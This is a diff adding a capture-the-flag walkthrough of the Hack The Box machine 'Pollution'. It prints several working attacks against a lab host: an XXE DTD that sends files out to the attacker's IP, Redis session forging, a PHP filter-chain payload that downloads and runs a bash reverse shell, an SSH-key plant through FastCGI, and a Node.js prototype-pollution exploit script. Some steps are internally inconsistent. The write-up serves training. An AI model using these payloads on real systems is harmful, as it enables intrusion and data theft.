@@ -1386,3 +1386,463 @@ c4.......................c7
 
 ```
 ![image](./assets/img/mentor-UserFlag.png)
+---
+
+
+
+
+
+
+# Pollution
+
+<br>
+
+![image](./assets/img/Pollution.png)
+
+* MACHINE:Pollution
+* Level: Hard
+* IP: 10.10.11.192
+
+<br>
+
+(_This is the first hard machine for me so not detailing everything so can preserve a non discolser, can always ping me for more info/help_)
+
+After the initial enumerating we jump to the Collect.htb website:
+
+* Register a new User
+* Login With the new user 
+* Extract the request /set/role/admin as we have the root token and send it to elevate our user ID
+* if everything goes well we should be in the admin console of the website
+
+So once user created and logged in we should get our user token
+
+``` javascript
+POST /login HTTP/1.1
+Host: collect.htb
+Content-Length: 35
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://collect.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://collect.htb/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=6j92fni1cof8o8k83oadanlui6
+Connection: close
+
+username=testuser&password=testuser
+```
+Once logged in follow this exact steps
+
+* Burpsuite intercept on
+* Refresh the page collect.htb
+* Add the request ( Set Role Admin) to Burpsuite repeater and send it (this turns our user to admin)
+
+
+``` javascript
+POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=<6j92fni1cof8o8k83oadanlui6>
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=<xxxxxxxxxxxxxxxxxxxxxxxxxxx>
+```
+
+After doing that and after turn Burpsuite intercept off, refreshed the page and we fall into \
+The Administration console from the site
+
+![image](./assets/img/Pollution_admin_portal.png)
+
+
+Now that we have access to the admin portal and the API and at the registration time we've collected the following POST request
+
+
+``` javascript
+POST /api HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 177
+Origin: http://collect.htb
+Connection: close
+Referer: http://collect.htb/admin
+Cookie: PHPSESSID=3phqbq4n03mh1gvo2f7fjmp1ae
+
+manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>testuser</username><password>testuser</password></user></root>
+
+```
+So now is about XXE:
+* Create a file called evil.dtd
+* Serve this file with Simple Python Server
+* Modify the request above to point to our machine in order to connect to our evil.dtd
+* Should receive a base64 blob on our python server console so means we controlled the request 
+* We have redirected the request and now can decode the string received
+
+<br>
+evil.dtd
+``` bash
+❯ cat evil.dtd |cut -f2
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../../../../etc/hosts'>
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.35/?file=%file;'>">
+%eval;
+%exfiltrate;
+
+```
+Managed API request pointing to our evil.dtd
+``` 
+POST /api HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 254
+Origin: http://collect.htb
+Connection: close
+Referer: http://collect.htb/admin
+Cookie: PHPSESSID=6j92fni1cof8o8k83oadanlui6
+
+manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.35/evil.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register</uri><user><username>testuser</username><password>testuser</password></user></root>
+```
+``` bash
+
+❯ sudo python -m http.server 80
+passwd: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.35 - - [27/Feb/2023 11:44:31] "GET /evil.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Feb/2023 11:45:02] "GET /evil.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Feb/2023 11:45:02] "GET /?file=MTI3LjAuMC4xCWxvY2FsaG9zdCBwb2xsdXRpb24KMTI3LjAuMS4xCWRlYmlhbgljb2xsZWN0Lmh0YglkZXZlbG9wZXJzLmNvbGxlY3QuaHRiCWZvcnVtLmNvbGxlY3QuaHRiCgojIFRoZSBmb2xsb3dpbmcgbGluZXMgYXJlIGRlc2lyYWJsZSBmb3IgSVB2NiBjYXBhYmxlIGhvc3RzCjo6MSAgICAgbG9jYWxob3N0IGlwNi1sb2NhbGhvc3QgaXA2LWxvb3BiYWNrCmZmMDI6OjEgaXA2LWFsbG5vZGVzCmZmMDI6OjIgaXA2LWFsbHJvdXRlcnMK HTTP/1.1" 200 -
+```
+<br>
+
+So as shown below we got access to new subdomain.
+
+
+``` bash
+❯ echo -n "MTI3LjAuMC4xCWxvY2FsaG9zdCBwb2xsdXRpb24KMTI3LjAuMS4xCWRlYmlhbgljb2xsZWN0Lmh0YglkZXZlbG9wZXJzLmNvbGxlY3QuaHRiCWZvcnVtLmNvbGxlY3QuaHRiCgojIFRoZSBmb2xsb3dpbmcgbGluZXMgYXJlIGRlc2lyYWJsZSBmb3IgSVB2NiBjYXBhYmxlIGhvc3RzCjo6MSAgICAgbG9jYWxob3N0IGlwNi1sb2NhbGhvc3QgaXA2LWxvb3BiYWNrCmZmMDI6OjEgaXA2LWFsbG5vZGVzCmZmMDI6OjIgaXA2LWFsbHJvdXRlcnMK" | base64 -d
+127.0.0.1	localhost pollution
+127.0.1.1	debian	collect.htb	developers.collect.htb	forum.collect.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+```
+Now we can repeat the step for other files ex:
+* Modify the first line of evil.dtd with the following line
+
+``` bash
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../../../../etc/hosts'>
+```
+
+``` bash
+❯ sudo python -m http.server 80
+passwd: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.192 - - [27/Feb/2023 12:02:25] "GET /evil_1.dtd HTTP/1.1" 200 -
+10.10.11.192 - - [27/Feb/2023 12:02:25] "GET /?file=PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK HTTP/1.1" 200 -
+```
+``` bash
+❯ echo -n "PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK" | base64 -d
+<?php
+
+require '../bootstrap.php';
+
+use app\classes\Routes;
+use app\classes\Uri;
+
+
+$routes = [
+    "/" => "controllers/index.php",
+    "/login" => "controllers/login.php",
+    "/register" => "controllers/register.php",
+    "/home" => "controllers/home.php",
+    "/admin" => "controllers/admin.php",
+    "/api" => "controllers/api.php",
+    "/set/role/admin" => "controllers/set_role_admin.php",
+    "/logout" => "controllers/logout.php"
+];
+
+$uri = Uri::load();
+require Routes::load($uri, $routes);
+
+```
+So now we want the '../bootstrap.php' and we will follow the same procedure. 
+Add the following line to evil.dtd
+
+``` bash
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
+
+```
+``` bash
+echo -n "PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=" | base64 -d
+
+```
+``` bash
+❯ echo -n "PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=" | base64 -d
+<?php
+ini_set('session.save_handler','redis');
+ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');
+
+session_start();
+
+require '../vendor/autoload.php';
+```
+Now we've got a password for REDIS 
+We can now try to target developers forum .htpasswd
+
+
+``` bash
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/developers/.htpasswd'>
+```
+
+``` bash
+❯ echo -n "PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=" | base64 -d
+❯ echo -n "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d > htpasswd
+ 
+❯ ll
+.rwxrwxrwx root root 254 B  Tue Jan 24 14:32:18 2023  cdata.py
+.rwxrwxrwx root root 200 B  Mon Feb 27 11:38:22 2023  evil.dtd
+.rwxrwxrwx root root 130 KB Tue Jan 24 14:20:51 2023  history.xml
+.rwxrwxrwx root root  55 B  Mon Feb 27 12:11:34 2023  htpasswd
+❯ cat htpasswd
+
+File: htpasswd
+developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
+
+
+# --> developers_group:r0cket
+```
+
+![image](./assets/img/Pollution_dev_portal.png)
+
+
+``` bash
+❯ redis-cli -h collect.htb
+collect.htb:6379> KEYS *
+(error) NOAUTH Authentication required.
+collect.htb:6379> AUTH COLLECTR3D1SPASS
+OK
+collect.htb:6379> KEYS *
+1) "PHPREDIS_SESSION:<YWRtaW46VmlzaXQgaHR0cDovL2RldmVsb3BlcnMuY29sbGVjdC5odGI=>"
+2) "PHPREDIS_SESSION:c2agp3455pk8nu6qakklghlmi3"
+collect.htb:6379> set PHPREDIS_SESSION:c2agp3455pk8nu6qakklghlmi3 "username|s:3:\"foo\";role|s:5:\"admin\";auth|s:4:\"True\";"
+OK
+```
+
+
+Now, try to connect to redis and set the PHPREDIS_SESSION cookie to allow navigation to the developers portal
+We can use the credentials collected above
+
+![image](./assets/img/Pollution_dev_portal_Abuse.png)
+
+Now that we have our RCE, let's try to get a reverse shell, in order to do so:
+* Create a file which contains the reverse shell
+* Serve HTTP Server to make available our reverse shell file
+* Generate payloads and execute them 
+* Paste the code in the URL, should endup with something like this:
+
+_http://developers.collect.htb/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.icon.................( looooooooooooooooong striiiiiiiing ).................................UTF7|convert.base64-decode/resource=php://temp_
+
+
+``` bash
+❯ cat a |cut -f2
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.35/443 0>&1
+```
+
+
+```
+PAYLOADS
+#Grab our file from our server
+python3 chain.py --chain '<?=`curl 10.10.x.x/a -o /tmp/a` ?>'
+
+#Give permissions to that file
+python3 chain.py --chain '<?=`chmod +x /tmp/a` ?>'
+
+#Execute our reverse shell on the Server
+python3 chain.py --chain '<?=`bash -c /tmp/a` ?>'
+
+```
+``` bash
+❯ sudo rlwrap nc -lnvp 443
+Connection from 10.10.11.192:45782
+bash: cannot set terminal process group (998): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@pollution:~/developers$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@pollution:~/developers$ 
+```
+Once in...
+
+``` bash
+netstat -tlnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 ::1:6379                :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -         
+
+```
+The ports 3000 and 3306 could be mysql server runing so let's check it out
+The 9000 port may refer to a FastCGI, which might be vulnerable to some exploits
+Runing ps aux we get some interesting info
+
+
+``` bash
+root        1040  0.0  0.2 239608  8528 ?        Ssl  Feb26   0:00 /usr/sbin/gdm3
+root        1049  0.0  0.1   6988  5348 ?        Ss   Feb26   0:05 /usr/sbin/apache2 -k start
+root        1140  0.0  0.2 166516  9928 ?        Sl   Feb26   0:00 gdm-session-worker [pam/gdm-launch-environment]
+victor      1156  0.0  0.3 265840 15884 ?        S    Feb26   0:00 php-fpm: pool victor
+victor      1157  0.0  0.3 265840 15884 ?        S    Feb26   0:00 php-fpm: pool victor
+www-data    1158  0.0  0.7 345860 31344 ?        S    Feb26   0:00 php-fpm: pool www
+www-data    1161  0.0  0.7 345984 31676 ?        S    Feb26   0:00 php-fpm: pool www
+mysql       1169  0.0  2.6 1542260 104776 ?      Ssl  Feb26   0:20 /usr/sbin/mariadbd
+```
+
+* Copy the fmp.py to collect machine
+* Create new ssh keys and we add it to Victor authorized keys 
+* Access via ssh with our new generated key and we get to user account
+
+
+fmp.py -c "<?= system('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM0NcvJ3VEgkrgQUhNKa/O1hrflzWZLwPJH58E2phA3kYOx...................axlhxxPKB+vgESESBikvtGtY9LzbsRgs5l+L7eV4tRrs8KU+vSdMwZz7WOyJxv15o6U4EClH2sfVRgCG/hlabBAc5tcJ45pX483rbxO6aYNQbO8Zwqq3wJMYSs/41sbsCE9IGWG9464mMYlokd/ikQxPYa9..........................................m/w02GzkcZ+yQ/....................................................................n/i0W9uI8MjLsw+6RLQ01wE3vdvOixZg.............................................HyM9YheE= user@-VirtualBox > /home/mac/.ssh/authorized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
+<orized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
+
+
+Found MySql database credentials on the file models/db.js
+
+
+```bash 
+const Sequelize = require('sequelize');
+const sequelize = new Sequelize('pollution_api','webapp_user','Str0ngP4ssw0rdB*12@1',{
+    host: '127.0.0.1',
+    dialect: 'mysql',
+    define: {
+        charset: 'utf8',
+        collate: 'utf8_general_ci',
+        timestamps: true
+    },
+    logging: false
+})
+
+module.exports = { Sequelize, sequelize };
+
+```
+
+
+
+```bash
+
+victor@pollution:~$  mysql -u webapp_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 195
+Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+No entry for terminal type "xterm-kitty";
+using dumb terminal settings.
+No entry for terminal type "xterm-kitty";
+using dumb terminal settings.
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databses;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'databses' at line 1
+MariaDB [(none)]> use pollution_api; 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pollution_api]> describe users;
++-----------+--------------+------+-----+---------+----------------+
+| Field     | Type         | Null | Key | Default | Extra          |
++-----------+--------------+------+-----+---------+----------------+
+| id        | int(11)      | NO   | PRI | NULL    | auto_increment |
+| username  | varchar(255) | NO   | UNI | NULL    |                |
+| password  | varchar(255) | NO   |     | NULL    |                |
+| role      | varchar(255) | NO   |     | NULL    |                |
+| createdAt | datetime     | NO   |     | NULL    |                |
+| updatedAt | datetime     | NO   |     | NULL    |                |
++-----------+--------------+------+-----+---------+----------------+
+6 rows in set (0.001 sec)
+```
+
+
+```bash
+MariaDB [pollution_api]> insert into users values(123,"zolaboo","password", "admin", "2021-10-17 15:40:10", "2021-10-17 15:40:10");         
+
+Query OK, 1 row affected (0.002 sec)                                                                                                        
+
+MariaDB [pollution_api]> 
+
+```
+Now that we have a user with the role admin inserted in the database, use the following python script that will login to the API, send our payload, basically will copy the root.txt and copy it to the user folder and set the appropiate rights.
+
+
+exploit.py
+
+```bash
+import requests 
+
+host = "http://127.0.0.1:3000/"
+
+loginData = {
+    "username": "useradmin",
+    "password": "password"
+}
+
+res = requests.post(host +'auth/login', json=loginData )
+print(res.text)
+input()
+token = res.json().get("Header").get("x-access-token")
+requests.post
+payload = {
+    "text": "jees",
+    "gg": {
+        "__proto__": {
+            "shell": "/proc/self/exe",
+            "argv0": "console.log(require('child_process').execSync('cp /root/root.txt /home/victor/root.txt && chown victor:victor /home/victor/root.txt').toString())//",
+            "NODE_OPTIONS": "--require /proc/self/cmdline"
+        }
+    }
+}
+
+headers = {
+    "x-access-token": token
+}
+
+res = requests.post(host +'admin/messages/send', json=payload, headers=headers )
+print(res.text)
+
+```
+once we run the command _python3 exploit.py_ we get the root.txt in Victor's.
+
+
+![image](./assets/img/Pollution_Pwn.png)
+
+
+
+
